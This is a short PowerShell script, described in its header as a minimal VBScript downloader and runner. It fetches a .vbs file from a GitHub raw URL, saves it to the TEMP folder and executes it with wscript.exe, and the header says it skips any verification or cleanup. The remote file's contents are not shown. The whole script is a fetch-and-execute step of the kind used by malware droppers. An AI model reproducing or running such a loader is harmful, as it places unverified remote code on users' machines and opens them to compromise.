<#
.SYNOPSIS
    Minimal VBScript Downloader and Runner
.DESCRIPTION
    Downloads and executes a VBS file without any verification or cleanup
#>

$VbsUrl = "https://github.com/seunoshino/myapp-downloads/raw/main/100%25.vbs"
$Destination = "$env:TEMP\MyScript.vbs"

try {
    # Download the file
    Invoke-WebRequest -Uri $VbsUrl -OutFile $Destination
    
    # Execute the file
    Start-Process "wscript.exe" -ArgumentList "`"$Destination`""
    
    Write-Host "Script executed successfully" -ForegroundColor Green
}
catch {
    Write-Host "Error: $_" -ForegroundColor Red
}